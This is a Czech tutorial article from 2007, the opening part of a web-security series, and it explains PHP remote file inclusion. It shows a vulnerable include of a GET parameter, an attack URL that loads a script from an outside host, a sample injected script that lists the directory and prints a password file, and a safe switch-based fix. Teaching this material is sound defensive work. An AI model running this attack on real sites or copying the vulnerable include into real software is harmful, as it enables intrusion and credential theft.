2007-07-26-hackerem-sam-sobe-1-php-injection

(15, 'hackerem-sam-sobe-1-php-injection', '2007-07-26 15:24:46', 'Hackerem sám sobě (1) - PHP Injection',

Tento článek startuje menší seriál o bezpečnosti webových aplikací. Řeknu vám,
jak hackovat své vlastní stránky za účelem důkladného otestování bezpečnosti
vašeho webu. Tím vás ale nenabádám, abyste tyto techniky zkoušeli na stránkách,
které nepatří vám - žádné skrývání pomocí sítě "TOR":http://tor.eff.org/ a
nabourávání webu FBI prosím nedělejte.

Všechny techniky se pokusím prakticky ukázat - to znamená, že uvidíte ukázky kódu
a odkazy přímo na PHP skripty, kde lze tuto chybu pozorovat. V žádném případě
nebudu zacházet až příliš do hloubky - další rozšiřování kódu je na vaší fantazii.

PHP Injection
=============

Začnu tím nejjednodušším, kde dělají chyby většinou jen začátečníci. Spočívá
v injection = injekci, tedy vložení cizího skriptu do stránky. Bezpečnostní
riziko mohou způsobit funkce, které provádějí kód z externích souborů - nejčastěji
`include` nebo `require`.

[POKRACOVANI]

Nejvíce je s touto technikou spojován skript index.php, který obsahuje hlavičku
a patičku, přičemž samotný obsah je tvořen externím souborem vkládaným přes
`include`:

/---code html
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Ukázka PHP Injection</title>
  </head>
  <body>
    <!-- hlavicka a menu -->
    <?php include $_GET[ "stranka" ] ?>     
    <!-- paticka -->
  </body>
</html>
\\---

Tímto tvůrce stránek udělal jednoduchý skript díky kterému nemusí psát do
každého html souboru menu a další věci opakující se na každé stránce. Adresa
stránky s kontaktem bude mít následující tvar:

/---code txt
index.php?stranka=kontakt.php
\\---

Je to sice krásně jednoduché, ale takový skript má obrovskou bezpečnostní díru !
Pokud nemáme na serveru zakázáno `allow_url_include`, můžeme směle `kontakt.php`
nahradit vzdáleným skriptem:

/---code txt
index.php?stranka=http://domena.cz/zakernyskript.php
\\---

Tento vložený cizí skript pak bude mít stejné práva a možnosti jako váš vlastní
skript ! Může třeba prohlížet obsah adresáře nebo zobrazit obsah jakéhokoliv
vašeho skriptu:

/---code html
<p><strong>Klidně si vypíšu obsah adresáře:</strong></p>
<p>
  <?php
  $adresar = dir( "./" );
  while ( $polozka = $adresar->read( ) ) {
        echo $polozka."<br />\\n";
  }
  $adresar->close( );
  ?>
</p>
<p><strong>A pak obsah souboru s hesly:</strong></p>
<pre>
  <?php
  echo htmlspecialchars( file_get_contents( "passwords.php" ) );
  ?>
</pre>
\\---

**Ukázka:** "php-injection.php?stranka=http://www.jopress.cz/test/php-injection-hack.php":http://ukazky.chapadlo.cz/php-injection.php?stranka=http://www.jopress.cz/test/php-injection-hack.php

A je vymalováno - tato bezpečnostní díra přinesla útočníkovi celý web na stříbrném
podnose.

Řešení
======

Nejlepší metodou pro tento typ skriptu je nadefinování všech stránek pomocí
podmínek. Nebudeme tím spoléhat na vstup, což udělá náš skript bezpečným.

/---code html
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Bezpečný skript</title>
  </head>
  <body>
    <!-- hlavicka a menu -->
    <?php
    switch ( $_GET[ "stranka" ] ) {
          case "novinky":
        include "novinky.php";
        break;
      case "kontakt":
        include "kontakt.php";
        break;
      // a tak dale...
      default:
        include "404.php"; // stranka nenalezena	
        break;
    }
    ?>
    <!-- paticka -->
  </body>
</html>
\\---

Adresa pro zobrazení kontaktu bude nyní `index.php?stranka=kontakt`.

Doufám, že jste si uvědomili nedozírné následky prezentované chyby a dáte si
na PHP Injection pozor. Pokud používáte externí soubory, ujistěte se, že
opravdu nejdou podstřčit něčím jiným. Dávejte si pozor i na přípony, existují
situace, kdy i obrázek může být maskovaný skript :-)'),
